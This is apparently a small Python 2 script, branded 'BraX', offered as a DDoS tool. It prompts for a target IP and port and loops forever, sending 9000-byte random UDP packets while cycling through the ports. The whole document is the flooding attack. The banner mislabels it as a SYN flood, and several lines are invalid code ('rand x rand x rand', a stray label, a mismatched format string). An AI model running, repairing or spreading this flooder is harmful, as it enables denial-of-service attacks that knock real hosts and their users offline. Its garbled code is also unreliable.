# BraX

import os
import sys
import random
import socket

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print "#############################"
print "#         BraX V.1          #"
print "#############################"
print "#    Welcome to SYN DDos    #"
print "#############################"
print "Author   : BraX"
print "Facebook : https://m.facebook.com/J.cknew"
print "Verion Demo"

ip = raw_input("IP : ")
port = input("Port : ") 
	
os.system("clear")
os.system("figlet DDos Attack")
sent = 0
randpackets:
while True:
     size = rand x rand x rand 
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "succeed %s ! packet %s port:%s"%(sent,port)
     if port == (rand 65535) + 1 :
       port = 1
